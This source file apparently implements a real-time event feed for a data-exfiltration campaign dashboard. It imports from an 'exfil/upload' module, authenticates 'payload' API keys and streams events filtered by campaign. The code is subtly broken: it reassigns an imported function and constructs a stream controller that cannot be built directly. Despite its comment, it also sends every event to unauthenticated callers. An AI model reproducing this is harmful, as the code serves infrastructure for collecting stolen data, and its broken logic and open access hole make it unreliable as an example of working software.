// vercel-dashboard/api/realtime/events.js
// Server-Sent Events endpoint for real-time dashboard updates

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';
import { subscribeToRealtime, publishRealtimeEvent } from '../exfil/upload.js';

// In-memory event buffer for late-joiners (last 100 events)
const eventBuffer = [];
const MAX_BUFFER = 100;

function bufferEvent(event, data) {
  eventBuffer.push({ event, data, timestamp: Date.now() });
  if (eventBuffer.length > MAX_BUFFER) eventBuffer.shift();
}

// Override publish to also buffer
const originalPublish = publishRealtimeEvent;
publishRealtimeEvent = async (event, data) => {
  bufferEvent(event, data);
  return originalPublish(event, data);
};

export default async function handler(request, response) {
  // Verify auth (optional - allow unauthenticated for public dashboards, but check for campaign scope)
  const auth = await verifyPayloadApiKey(request);
  let campaignFilter = null;
  
  if (auth.valid && auth.role === 'campaign') {
    campaignFilter = auth.campaignId;
  }
  // Admin sees all, unauthenticated sees nothing (or public campaign if configured)

  // SSE headers
  response.setHeader('Content-Type', 'text/event-stream');
  response.setHeader('Cache-Control', 'no-cache');
  response.setHeader('Connection', 'keep-alive');
  response.setHeader('X-Accel-Buffering', 'no'); // Disable nginx buffering
  response.flushHeaders();

  // Send initial connection event
  const encoder = new TextEncoder();
  response.write(encoder.encode(`event: connected\ndata: ${JSON.stringify({ timestamp: new Date().toISOString(), campaignFilter })}\n\n`));

  // Send buffered events (last 50)
  for (const buffered of eventBuffer.slice(-50)) {
    if (!campaignFilter || buffered.data.campaignId === campaignFilter) {
      response.write(encoder.encode(`event: ${buffered.event}\ndata: ${JSON.stringify(buffered.data)}\n\n`));
    }
  }

  // Subscribe to real-time events
  const controller = new ReadableStreamDefaultController();
  const unsubscribe = subscribeToRealtime(controller);

  // Heartbeat interval
  const heartbeatInterval = setInterval(() => {
    response.write(encoder.encode(`event: heartbeat\ndata: ${JSON.stringify({ timestamp: new Date().toISOString() })}\n\n`));
  }, 30000);

  // Handle client disconnect
  request.on('close', () => {
    clearInterval(heartbeatInterval);
    unsubscribe();
  });

  // Keep connection alive (Vercel timeout is 30s for hobby, 60s for pro)
  // Stream will be kept open by the readable controller
  const stream = new ReadableStream({
    start(ctrl) {
      controller.enqueue = (chunk) => {
        try {
          ctrl.enqueue(chunk);
        } catch (e) {
          // Client disconnected
        }
      };
    },
    cancel() {
      clearInterval(heartbeatInterval);
      unsubscribe();
    }
  });

  // Pipe stream to response
  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    }
  });
}

// Also export a simple GET for polling fallback
export async function handlePoll(request, response) {
  const auth = await verifyPayloadApiKey(request);
  const campaignFilter = auth.valid && auth.role === 'campaign' ? auth.campaignId : null;
  const { since } = request.query;
  
  const sinceTime = since ? parseInt(since) : Date.now() - 60000;
  
  const events = eventBuffer
    .filter(e => e.timestamp > sinceTime)
    .filter(e => !campaignFilter || e.data.campaignId === campaignFilter)
    .slice(-100);

  response.json({ events, timestamp: Date.now() });
}